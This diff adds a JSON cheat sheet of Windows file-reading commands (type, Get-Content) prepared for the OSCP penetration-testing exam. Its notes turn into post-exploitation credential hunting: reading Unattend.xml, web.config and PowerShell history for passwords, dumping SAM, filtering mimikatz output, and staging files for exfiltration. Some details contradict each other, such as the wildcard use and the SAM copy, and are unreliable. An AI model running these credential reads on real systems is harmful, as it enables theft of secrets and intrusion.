@@ -1,0 +1,147 @@
+{
+  "metadata": {
+    "file_purpose": "Windows file reading commands for credential discovery, configuration enumeration, and flag retrieval during OSCP exam",
+    "oscp_relevance": "HIGH - File reading is fundamental for OSCP exam: reading flags, configuration files with credentials, enumeration script output, and verifying file uploads",
+    "educational_context": "Windows provides multiple methods for file reading: type (CMD built-in, similar to cat), Get-Content (PowerShell cmdlet with advanced features), and notepad (GUI). Each has trade-offs: type is universal (works on all Windows versions), Get-Content has PowerShell-specific features (filtering, tail), notepad requires GUI access. For OSCP remote shells, type is most reliable.",
+    "prerequisites": [
+      "Shell access to Windows target (reverse shell, bind shell, Evil-WinRM, RDP)",
+      "Read permissions on target file (user, group, or Everyone access)",
+      "File path knowledge (from enumeration or predictable locations)"
+    ],
+    "related_techniques": [
+      "Evil-WinRM file download (download C:\\temp\\flag.txt)",
+      "Certutil for file transfer (certutil -encode file.txt file.b64)",
+      "PowerShell file enumeration (Get-ChildItem -Recurse -Filter *.txt)",
+      "SMB file access (smbclient //IP/C$ -U user -c 'get file.txt')",
+      "Windows enumeration scripts output analysis (winPEAS.txt, PowerUp.txt)"
+    ],
+    "attack_chain": [
+      "1. Gain shell access on Windows target (exploit, credential reuse)",
+      "2. Enumerate file system for interesting files (flags, credentials, configs)",
+      "3. Read files using type or Get-Content",
+      "4. Extract credentials, passwords, or flags from file contents",
+      "5. Use harvested data for lateral movement or privilege escalation",
+      "6. Download important files for offline analysis"
+    ],
+    "common_file_locations": [
+      "Flags: C:\\Users\\Administrator\\Desktop\\flag.txt, C:\\Users\\<USER>\\Desktop\\local.txt",
+      "Credentials: C:\\inetpub\\wwwroot\\web.config, C:\\Windows\\Panther\\Unattend.xml, C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+      "Configuration: C:\\Program Files\\<APP>\\config.ini, C:\\xampp\\htdocs\\config.php",
+      "Enumeration output: C:\\temp\\winPEAS.txt, C:\\temp\\mimikatz.txt, C:\\temp\\bloodhound.json",
+      "SAM database: C:\\Windows\\System32\\config\\SAM, C:\\Windows\\System32\\config\\SYSTEM"
+    ]
+  },
+  "commands": [
+    {
+      "id": "windows-read-file-type",
+      "name": "Windows Read File with type Command",
+      "category": "utilities",
+      "subcategory": "file-operations",
+      "command": "type <FILE_PATH>",
+      "description": "Read and display file contents in Windows CMD shell. Universal method for viewing text files (flags, credentials, configuration, logs) on any Windows version. Equivalent to Linux 'cat' command.",
+      "variables": [
+        {
+          "name": "<FILE_PATH>",
+          "description": "Full or relative path to file. Supports: Absolute paths (C:\\Users\\admin\\Desktop\\flag.txt), Relative paths (.\\flag.txt, ..\\..\\file.txt), UNC paths (\\\\\\\\server\\\\share\\\\file.txt), Environment variables (%USERPROFILE%\\\\Desktop\\\\flag.txt). Wildcards NOT supported (use 'for' loop for multiple files).",
+          "example": "C:\\Users\\Administrator\\Desktop\\flag.txt",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "type command": "Built-in CMD command that outputs file contents to STDOUT. NO FLAGS - simple syntax: type <file>. WHY USE: (1) Universal - works on all Windows versions (XP through 11), (2) No dependencies - always available even in restricted shells, (3) Fast - reads entire file instantly, (4) Pipeable - can combine with 'findstr' for grep-like functionality: type file.txt | findstr 'password'. LIMITATIONS: No pagination (entire file dumps at once), no line numbers, no syntax highlighting.",
+        "Path handling": "Windows paths use backslashes (\\) which are escape characters in some shells. SOLUTIONS: (1) Double backslashes in scripts: type C:\\\\Users\\\\admin\\\\file.txt, (2) Use forward slashes (Windows accepts): type C:/Users/admin/file.txt, (3) Use quotes for paths with spaces: type \"C:\\Program Files\\app\\config.ini\", (4) Tab completion in interactive shells. RELATIVE PATHS: .\\file.txt (current directory), ..\\file.txt (parent directory), ..\\..\\Windows\\System32\\drivers\\etc\\hosts (traverse up).",
+        "Redirection": "Redirect output to file: type input.txt > output.txt (overwrites), type input.txt >> output.txt (appends). WHY: Extract specific data for exfiltration, combine multiple files, save output for offline analysis. EXAM EXAMPLE: type C:\\Users\\*\\Desktop\\*.txt > C:\\temp\\all_flags.txt (combine all potential flags). Pipe to findstr: type web.config | findstr 'connectionString' (extract database credentials).",
+        "Error handling": "Common errors: (1) 'The system cannot find the file specified' - file doesn't exist or wrong path, (2) 'Access is denied' - no read permissions, (3) 'The process cannot access the file because it is being used by another process' - file locked. WORKAROUNDS: Copy file first: copy locked.txt C:\\temp\\unlocked.txt, then read copy. Check existence: if exist C:\\file.txt (type C:\\file.txt) else (echo Not found)."
+      },
+      "success_indicators": [
+        "File contents displayed in console output",
+        "For text files: readable content, proper line breaks",
+        "For flags: hash format (MD5: 32 hex chars, SHA1: 40 hex chars) or custom format",
+        "Exit code 0 (check: echo %errorlevel%)",
+        "Can copy output successfully for documentation"
+      ],
+      "failure_indicators": [
+        "Error: 'The system cannot find the file specified' - wrong path or file doesn't exist",
+        "Error: 'Access is denied' - insufficient read permissions",
+        "Error: 'file is being used by another process' - file locked by application",
+        "Garbage output for binary files (.exe, .dll, .zip) - not a text file",
+        "Blank output when file should have content - encoding issue or empty file"
+      ],
+      "troubleshooting": {
+        "File not found": "Error: 'The system cannot find the file specified'. CAUSES: (1) Typo in path, (2) File in different location, (3) Case sensitivity in some contexts. SOLUTION: Verify path: dir C:\\Users\\Administrator\\Desktop (list directory contents). Use tab completion for autocomplete. Check current directory: cd (shows current path). Search for file: dir C:\\ /s /b | findstr flag.txt (recursive search from C:). Common flag locations: C:\\Users\\Administrator\\Desktop\\flag.txt (admin flag), C:\\Users\\<USER>\\Desktop\\local.txt (user flag).",
+        "Access denied": "Error: 'Access is denied' when reading file. CAUSES: (1) No read permissions for current user, (2) File permissions restricted to specific group, (3) Protected system file. SOLUTION: Check permissions: icacls C:\\file.txt (shows ACL). Elevate if admin: Run shell as admin or use runas. Copy to temp with permissions: copy C:\\protected.txt C:\\temp\\readable.txt (may inherit different permissions). Alternative: Use PowerShell Get-Content with -Force flag. If really stuck: Download via Evil-WinRM: download C:\\file.txt.",
+        "File locked error": "Error: 'The process cannot access the file because it is being used by another process'. CAUSES: (1) Application has file open (IIS web.config, SQL logs), (2) Multiple shells accessing same file, (3) Windows system file in use. SOLUTION: Copy file first: copy C:\\inetpub\\wwwroot\\web.config C:\\temp\\web.config, read copy. Stop locking process: tasklist (find process), taskkill /F /PID <PID> (requires admin). Use shadow copies: vssadmin list shadows (if exists), mklink to shadow copy. Alternative: Read with PowerShell -Raw flag.",
+        "Binary file garbage": "Output shows random characters, symbols, null bytes. CAUSE: Trying to read binary file (.exe, .dll, .docx, .zip) as text. SOLUTION: Verify file type: dir C:\\file.exe (check extension). For Office docs (.docx, .xlsx): Download and open locally. For executables: Transfer to Kali for analysis: download file.exe. For compressed archives: Extract first: expand file.zip C:\\temp (built-in), then read extracted files. Use 'file' equivalent: PowerShell [System.IO.Path]::GetExtension('file.exe').",
+        "Encoding issues": "File displays with strange characters (�, boxes) or appears empty when it has content. CAUSES: (1) Unicode/UTF-16 encoding (type expects ASCII), (2) Different codepage (non-English Windows), (3) BOM (Byte Order Mark) corruption. SOLUTION: Use PowerShell Get-Content with -Encoding: Get-Content file.txt -Encoding UTF8, Get-Content file.txt -Encoding Unicode (UTF-16). Check encoding: Get-Content file.txt -Encoding Byte | Select-Object -First 3 (look for BOM: EF BB BF = UTF-8). Convert: Get-Content file.txt | Out-File -Encoding ASCII new.txt."
+      },
+      "notes": "OSCP METHODOLOGY: File reading is FUNDAMENTAL for exam success. You MUST read flags, configuration files, and enumeration output. 'type' is the fastest method for quick reads in CMD shells.\n\nTIME ESTIMATE: 10-30 seconds (navigate to directory + read file)\n\nWORKFLOW:\n1. Gain shell access (exploit, Evil-WinRM, RDP)\n2. Navigate to target directory: cd C:\\Users\\Administrator\\Desktop\n3. Verify file exists: dir\n4. Read file: type flag.txt\n5. Copy flag for documentation (screenshot or copy-paste)\n6. Verify flag format (32 chars MD5, 40 chars SHA1, or custom)\n7. Submit flag\n\nCOMMON OSCP FILE READING TARGETS:\n\n**1. FLAGS:**\n- Admin flag: type C:\\Users\\Administrator\\Desktop\\flag.txt\n- User flag: type C:\\Users\\<USERNAME>\\Desktop\\local.txt\n- Proof flag: type C:\\Users\\Administrator\\Desktop\\proof.txt\n- Root flag: type C:\\Users\\Administrator\\Desktop\\root.txt\n- Custom locations: type C:\\inetpub\\wwwroot\\flag.txt, type C:\\temp\\flag.txt\n\n**2. CREDENTIALS IN CONFIG FILES:**\n- IIS web.config: type C:\\inetpub\\wwwroot\\web.config | findstr 'connectionString'\n- Unattend.xml (local admin password): type C:\\Windows\\Panther\\Unattend.xml | findstr 'Password'\n- PHP config: type C:\\xampp\\htdocs\\config.php | findstr 'password'\n- .NET appsettings: type C:\\inetpub\\wwwroot\\appsettings.json\n- FileZilla credentials: type C:\\Program Files\\FileZilla Server\\FileZilla Server.xml\n\n**3. POWERSHELL HISTORY (GOLDMINE):**\n```cmd\ntype %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n```\nWHY: Captures ALL PowerShell commands from user (including passwords in plaintext).\nEXAMPLE FINDINGS: net user admin P@ssw0rd, Invoke-WebRequest -Uri http://server/shell.exe -OutFile C:\\temp\\shell.exe\n\n**4. ENUMERATION OUTPUT:**\n- winPEAS: type C:\\temp\\winPEAS.txt | findstr 'Password' (find credential mentions)\n- PowerUp: type C:\\temp\\PowerUp.txt | findstr 'Modifiable' (find writable service binaries)\n- Mimikatz output: type C:\\temp\\creds.txt | findstr 'NTLM' (extract hashes)\n- BloodHound JSON: type C:\\temp\\bloodhound.json (verify data collected)\n\n**5. LOG FILES:**\n- IIS logs: type C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log | findstr 'admin'\n- Application logs: type C:\\logs\\app.log | findstr 'error'\n- Custom logs: type C:\\Program Files\\App\\debug.log\n\nFILTERING WITH FINDSTR (GREP EQUIVALENT):\n```cmd\ntype file.txt | findstr 'password'          # Case-insensitive search\ntype file.txt | findstr /i 'password'       # Explicit case-insensitive\ntype file.txt | findstr /i 'pass password'  # Multiple terms (OR logic)\ntype file.txt | findstr /i /c:'admin password'  # Phrase search\ntype file.txt | findstr /i /v 'comment'     # Invert match (NOT logic)\ntype file.txt | findstr /i /n 'password'    # Show line numbers\n```\n\nCOMBINING MULTIPLE FILES:\n```cmd\ntype C:\\Users\\*\\Desktop\\*.txt > C:\\temp\\all_flags.txt   # All desktop txt files\ntype C:\\inetpub\\wwwroot\\*.config | findstr 'password'  # All configs with passwords\nfor /r C:\\ %f in (*.config) do @type \"%f\" | findstr 'connectionString'  # Recursive search\n```\n\nREDIRECTION FOR EXFILTRATION:\n```cmd\ntype C:\\Users\\Administrator\\Desktop\\flag.txt > C:\\temp\\exfil.txt\ntype C:\\Windows\\System32\\config\\SAM > C:\\temp\\sam.save  # SAM dump (if admin)\ntype multiple_files*.txt >> C:\\temp\\combined.txt        # Append multiple\n```\n\nALTERNATIVE METHODS:\n- PowerShell: Get-Content C:\\file.txt (more features, but slower)\n- Certutil: certutil -encode C:\\file.txt C:\\file.b64 (base64 encode for exfil)\n- More command: more C:\\file.txt (pagination for large files)\n- Evil-WinRM download: download C:\\file.txt (transfer to Kali)\n- Notepad: notepad C:\\file.txt (GUI required - not for shells)\n\nVS. LINUX CAT:\n- type = cat (basic read)\n- type | findstr = cat | grep (search)\n- type file.txt > out.txt = cat file.txt > out.txt (redirect)\n- type *.txt = cat *.txt (NO - type doesn't support wildcards)\n- more = less (pagination)\n\nEXAM TIP: ALWAYS verify flag format before submitting:\n- MD5: 32 hexadecimal characters (0-9, a-f)\n- SHA1: 40 hexadecimal characters\n- SHA256: 64 hexadecimal characters\n- Custom: Varies (OSCP{...}, HTB{...}, or plain hash)\n\nDOCUMENTATION:\n- Screenshot of 'type flag.txt' output showing flag\n- Include full command in screenshot: C:\\Users\\Administrator\\Desktop> type flag.txt\n- Capture timestamp if possible (include 'date /t' and 'time /t' before type)\n- For report: Document exact file path and contents\n\nCOMMON MISTAKES:\n❌ Forgetting quotes for paths with spaces: type C:\\Program Files\\file.txt → \"C:\\Program Files\\file.txt\"\n❌ Using forward slash in CMD: type C:/file.txt works but inconsistent\n❌ Trying wildcards: type *.txt (doesn't work - use 'for' loop)\n❌ Not checking file existence first: dir before type\n❌ Reading binary files: Check extension before using type\n❌ Not documenting exact command: Screenshot should show full path",
+      "oscp_relevance": "high",
+      "tags": [
+        "OSCP:HIGH",
+        "WINDOWS",
+        "FILE_OPERATIONS",
+        "FLAG_RETRIEVAL",
+        "CREDENTIAL_DISCOVERY",
+        "ENUMERATION",
+        "CMD",
+        "POST_EXPLOITATION"
+      ]
+    },
+    {
+      "id": "powershell-get-content",
+      "name": "PowerShell Read File with Get-Content",
+      "category": "utilities",
+      "subcategory": "file-operations",
+      "command": "Get-Content <FILE_PATH>",
+      "description": "Read file contents using PowerShell cmdlet with advanced features: encoding support, filtering, tail functionality, and object pipeline. Preferred method for PowerShell environments and complex file operations.",
+      "variables": [
+        {
+          "name": "<FILE_PATH>",
+          "description": "Path to file (absolute or relative). Supports: Windows paths (C:\\file.txt), PowerShell paths (PSPath), UNC paths (\\\\\\\\server\\\\share\\\\file.txt), wildcards (C:\\logs\\\\*.txt), environment variables ($env:USERPROFILE\\\\Desktop\\\\flag.txt). Can accept pipeline input.",
+          "example": "C:\\Users\\Administrator\\Desktop\\flag.txt",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "Get-Content cmdlet": "PowerShell cmdlet (not CMD command) for reading files. ALIAS: cat, gc, type (in PowerShell context). WHY BETTER THAN CMD 'type': (1) Encoding support (-Encoding UTF8, Unicode, ASCII), (2) Filtering (-Filter), (3) Tail functionality (-Tail 10), (4) Line-based processing (returns array of lines), (5) Pipeline integration (object-oriented). TRADEOFF: Slower than CMD 'type', requires PowerShell environment.",
+        "-Encoding flag": "Specify file encoding. OPTIONS: ASCII, UTF8, UTF7, UTF32, Unicode (UTF-16LE), BigEndianUnicode (UTF-16BE), Default, Byte. SYNTAX: Get-Content file.txt -Encoding UTF8. WHY IMPORTANT: Windows files can be UTF-16 (default for Notepad), UTF-8 (web configs), or ASCII (logs). Wrong encoding shows garbage characters or missing content. DEFAULT: UTF-8 in PowerShell 6+, Unicode in PowerShell 5.1. EXAM TIP: If file appears empty or corrupted with 'type', try Get-Content with -Encoding Unicode.",
+        "-Tail flag": "Read last N lines of file (like Linux 'tail -n'). SYNTAX: Get-Content file.txt -Tail 10 (last 10 lines). WHY USEFUL: (1) Large log files - don't dump entire file, (2) Find recent entries (most recent at bottom), (3) Monitor growing files with -Wait. EXAM EXAMPLE: Get-Content C:\\inetpub\\logs\\*.log -Tail 50 | findstr 'admin' (find recent admin activity in IIS logs).",
+        "-Wait flag": "Monitor file for new content (like 'tail -f'). SYNTAX: Get-Content file.log -Wait -Tail 10. BEHAVIOR: Displays last 10 lines, then blocks and shows new lines as appended. CTRL+C to exit. WHY USEFUL: Monitor application logs in real-time, debug running processes, watch for trigger events. EXAM SCENARIO: Monitor reverse shell payload execution: Get-Content C:\\temp\\shell.log -Wait (see errors if payload fails).",
+        "-Raw flag": "Read entire file as single string (not array of lines). SYNTAX: Get-Content file.txt -Raw. WHY USEFUL: (1) Performance - faster for large files, (2) Preserve exact formatting (no line splitting), (3) String manipulation (regex across multiple lines), (4) Base64 encoding: [Convert]::ToBase64String([IO.File]::ReadAllBytes('file.exe')). EXAM EXAMPLE: Read multi-line certificate: Get-Content cert.pem -Raw (preserves -----BEGIN CERTIFICATE----- formatting)."
+      },
+      "success_indicators": [
+        "File contents displayed line-by-line in console",
+        "For text files: proper encoding, readable content",
+        "Array of strings returned (can pipe to Where-Object, Select-String)",
+        "No error messages",
+        "Output can be assigned to variable: $content = Get-Content file.txt"
+      ],
+      "failure_indicators": [
+        "Error: 'Cannot find path' - file doesn't exist or wrong path",
+        "Error: 'Access to the path is denied' - insufficient permissions",
+        "Error: 'The process cannot access the file' - file locked",
+        "Garbage characters - wrong encoding",
+        "Empty output when file has content - encoding mismatch"
+      ],
+      "troubleshooting": {
+        "File not found": "Error: 'Get-Content : Cannot find path because it does not exist'. CAUSES: (1) Wrong path, (2) Typo, (3) Case sensitivity in some contexts. SOLUTION: Verify path: Test-Path C:\\file.txt (returns True/False). Use tab completion. List directory: Get-ChildItem C:\\Users\\Administrator\\Desktop. Find file recursively: Get-ChildItem C:\\ -Recurse -Filter 'flag.txt' -ErrorAction SilentlyContinue. Wildcard search: Get-Content C:\\logs\\app*.log.",
+        "Access denied": "Error: 'Access to the path is denied'. CAUSES: (1) No read permissions, (2) Admin-only file (SAM, SYSTEM), (3) Protected directory. SOLUTION: Run PowerShell as admin: Right-click → Run as Administrator, or Start-Process powershell -Verb RunAs. Check permissions: Get-Acl C:\\file.txt | Format-List. Use -Force flag: Get-Content C:\\file.txt -Force (bypasses some restrictions). Copy to accessible location: Copy-Item C:\\protected.txt C:\\temp\\readable.txt. Alternative: Download via Evil-WinRM if you have remote access.",
+        "Encoding issues": "File displays with �, boxes, or appears empty when it has content. CAUSES: (1) File is UTF-16 but PowerShell reads as UTF-8, (2) Non-ASCII characters (foreign languages), (3) BOM (Byte Order Mark) issues. SOLUTION: Try different encodings: Get-Content file.txt -Encoding Unicode (UTF-16LE), Get-Content file.txt -Encoding UTF8, Get-Content file.txt -Encoding ASCII. Detect encoding: Get-Content file.txt -Encoding Byte | Select-Object -First 3 (FF FE = UTF-16LE, FE FF = UTF-16BE, EF BB BF = UTF-8 BOM). Convert encoding: Get-Content file.txt -Encoding Unicode | Out-File -Encoding UTF8 new.txt.",
+        "File locked error": "Error: 'The process cannot access the file because it is being used by another process'. CAUSES: (1) Application has file open (IIS, SQL, logging), (2) Another PowerShell session accessing file. SOLUTION: Identify locking process: Get-Process | Where-Object {$_.Modules.FileName -eq 'C:\\file.txt'}. Stop process: Stop-Process -Name <ProcessName> -Force (requires admin). Copy file first: Copy-Item C:\\locked.txt C:\\temp\\copy.txt (may work if copy-on-read allowed). Use shadow copies: Get-CimInstance Win32_ShadowCopy (if VSS enabled), mount shadow, read from shadow path.",
+        "Large file performance": "Get-Content slow on multi-GB files. CAUSES: PowerShell loads entire file into memory as array. SOLUTION: Use -ReadCount for chunked reading: Get-Content huge.log -ReadCount 1000 | Where-Object {$_ -match 'error'} (process 1000 lines at a time). Use -Tail for recent data: Get-Content huge.log -Tail 1000. Use .NET FileStream for extreme performance: [System.IO.File]::ReadLines('C:\\huge.log') | Where-Object {$_ -match 'error'}. Alternative: Use CMD 'type' (faster for simple dumps)."
+      },
+      "notes": "OSCP METHODOLOGY: PowerShell Get-Content is PREFERRED when you have a PowerShell session (Evil-WinRM, PowerShell reverse shell). It provides better encoding support and filtering capabilities than CMD 'type'.\n\nTIME ESTIMATE: 10-30 seconds (same as 'type' for simple reads, faster for filtered reads)\n\nWORKFLOW:\n1. Verify PowerShell available: $PSVersionTable (shows version)\n2. Navigate to directory: cd C:\\Users\\Administrator\\Desktop\n3. List files: dir (or Get-ChildItem)\n4. Read file: Get-Content flag.txt\n5. Filter if needed: Get-Content log.txt | Select-String 'password'\n6. Export results: Get-Content file.txt | Out-File C:\\temp\\export.txt\n\nPOWERSHELL FILE READING PATTERNS:\n\n**1. BASIC READ:**\n```powershell\nGet-Content C:\\Users\\Administrator\\Desktop\\flag.txt\ncat C:\\file.txt  # Alias (shorter)\ngc C:\\file.txt   # Shorter alias\n```\n\n**2. FILTER CONTENT (GREP EQUIVALENT):**\n```powershell\nGet-Content file.txt | Select-String 'password'              # Case-insensitive\nGet-Content file.txt | Select-String -Pattern 'admin|root'  # Multiple patterns (OR)\nGet-Content file.txt | Select-String -CaseSensitive 'Admin' # Case-sensitive\nGet-Content file.txt | Select-String -NotMatch 'comment'    # Invert (NOT)\nGet-Content file.txt | Select-String 'pass' -Context 2,3    # Show 2 lines before, 3 after\n```\n\n**3. TAIL FUNCTIONALITY:**\n```powershell\nGet-Content log.txt -Tail 10                   # Last 10 lines\nGet-Content log.txt -Tail 50 | Select-String 'error'  # Last 50 lines with 'error'\nGet-Content log.txt -Wait -Tail 10             # Monitor in real-time (CTRL+C to exit)\n```\n\n**4. ENCODING HANDLING:**\n```powershell\nGet-Content file.txt -Encoding UTF8      # UTF-8 (web configs, Linux files)\nGet-Content file.txt -Encoding Unicode   # UTF-16LE (Windows Notepad default)\nGet-Content file.txt -Encoding ASCII     # ASCII only (no special chars)\nGet-Content file.txt -Encoding Byte      # Binary read (returns byte array)\n```\n\n**5. COMBINE MULTIPLE FILES:**\n```powershell\nGet-Content C:\\Users\\*\\Desktop\\*.txt                 # All desktop txt files\nGet-Content C:\\logs\\*.log | Select-String 'error'    # All logs with errors\nGet-ChildItem C:\\configs\\*.config | Get-Content | Select-String 'password'  # Recursive\n```\n\n**6. ADVANCED FILTERING:**\n```powershell\n# Extract lines between patterns\nGet-Content file.txt | Select-String -Pattern 'START' -Context 0,100 | Select-String -Pattern 'END' -Context 100,0\n\n# Count occurrences\nGet-Content log.txt | Select-String 'error' | Measure-Object\n\n# Get unique lines\nGet-Content file.txt | Sort-Object -Unique\n\n# Extract specific columns (CSV-like)\nGet-Content file.txt | ForEach-Object { ($_ -split '\\s+')[2] }  # 3rd column\n```\n\n**7. OUTPUT MANIPULATION:**\n```powershell\n# Save to variable\n$content = Get-Content C:\\file.txt\n\n# Export to file\nGet-Content input.txt | Out-File C:\\temp\\output.txt -Encoding UTF8\n\n# Convert to single string\n$text = Get-Content file.txt -Raw\n\n# Base64 encode\n$bytes = Get-Content file.exe -Encoding Byte\n[Convert]::ToBase64String($bytes) | Out-File file.b64\n```\n\n**OSCP EXAM SCENARIOS:**\n\n**Flag Retrieval:**\n```powershell\nGet-Content C:\\Users\\Administrator\\Desktop\\flag.txt\ncat C:\\Users\\*\\Desktop\\*.txt  # All user desktop files (find both user and admin flags)\n```\n\n**Credential Hunting:**\n```powershell\n# PowerShell history (commands with passwords)\nGet-Content $env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String 'password'\n\n# Unattend.xml (local admin password)\nGet-Content C:\\Windows\\Panther\\Unattend.xml -Encoding Unicode | Select-String 'Password'\n\n# Web.config (database credentials)\nGet-Content C:\\inetpub\\wwwroot\\web.config | Select-String 'connectionString|password'\n\n# Configuration files (various apps)\nGet-ChildItem C:\\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue | Get-Content | Select-String 'password'\n```\n\n**Enumeration Output Analysis:**\n```powershell\n# winPEAS output\nGet-Content C:\\temp\\winPEAS.txt | Select-String 'password|credential|Modifiable'\n\n# Mimikatz output\nGet-Content C:\\temp\\mimikatz.txt | Select-String 'NTLM|Password'\n\n# BloodHound data verification\nGet-Content C:\\temp\\*.json | Select-Object -First 10  # Verify JSON structure\n```\n\n**Log Analysis:**\n```powershell\n# IIS logs for admin activity\nGet-Content C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log -Tail 100 | Select-String 'admin|POST'\n\n# Application logs\nGet-Content C:\\Program Files\\App\\logs\\*.log | Select-String 'error|exception' -Context 2,2\n\n# Event logs (requires Export-Csv from Get-EventLog first)\nGet-Content C:\\temp\\security.csv | Select-String '4624|4625'  # Logon events\n```\n\n**VS. CMD TYPE:**\n| Feature | Get-Content (PowerShell) | type (CMD) |\n|---------|-------------------------|------------|\n| Speed | Slower (object pipeline) | Faster |\n| Encoding | Supports all encodings | ASCII/UTF-8 only |\n| Filtering | Native (\\| Select-String) | Pipe to findstr |\n| Tail | -Tail flag built-in | Requires workarounds |\n| Wildcards | Supports *.txt | Not supported |\n| Pipeline | Object-oriented | Text stream |\n| Availability | PowerShell sessions only | All CMD sessions |\n| OSCP Use | Evil-WinRM, PS shells | CMD shells, universal |\n\n**ALIASES:**\n- cat → Get-Content (Linux-style)\n- gc → Get-Content (short form)\n- type → Get-Content (in PowerShell - NOT CMD)\n\n**EXAM TIP:** Use Get-Content in Evil-WinRM and PowerShell reverse shells. Use CMD 'type' in basic reverse shells without PowerShell.\n\n**COMMON MISTAKES:**\n❌ Using Get-Content in CMD shell: 'Get-Content' is not recognized\n❌ Wrong encoding: Get-Content web.config shows garbage → Use -Encoding UTF8\n❌ Not filtering large files: Reading 10GB log with no filter → Use -Tail or Select-String\n❌ Forgetting quotes for paths with spaces: Get-Content C:\\Program Files\\file.txt → 'C:\\Program Files\\file.txt'\n❌ Mixing CMD and PowerShell syntax: Get-Content file.txt | findstr 'pattern' (works but inconsistent - use Select-String)",
+      "oscp_relevance": "high",
+      "tags": [
+        "OSCP:HIGH",
+        "WINDOWS",
+        "POWERSHELL",
+        "FILE_OPERATIONS",
+        "FLAG_RETRIEVAL",
+        "CREDENTIAL_DISCOVERY",
+        "ENUMERATION",
+        "POST_EXPLOITATION"
+      ]
+    }
+  ]
+}
